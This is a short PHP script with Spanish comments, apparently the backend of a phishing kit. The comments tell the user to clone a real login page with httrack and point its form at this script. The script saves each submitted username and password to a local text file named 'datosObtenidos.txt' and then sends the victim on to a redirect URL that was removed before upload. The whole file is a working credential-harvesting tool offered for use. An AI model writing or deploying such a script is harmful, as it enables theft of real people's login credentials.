// No se sube la página clonada con httrack, pero el código del login debe ser modificado para llamar a este código en el formulario correspondiente.
// En LINK se debe colocar la URL de la página a la que se redirigirá al usuario luego de enviar los datos. Se quitó la URL para su carga en GitHub.
<?php
$password = $_POST['password'];
$username = $_POST['username'];

$file = fopen("datosObtenidos.txt", "a");
fwrite($file, $username . '-' . $password . PHP_EOL);
fclose($file);

header("Location: LINK");
?>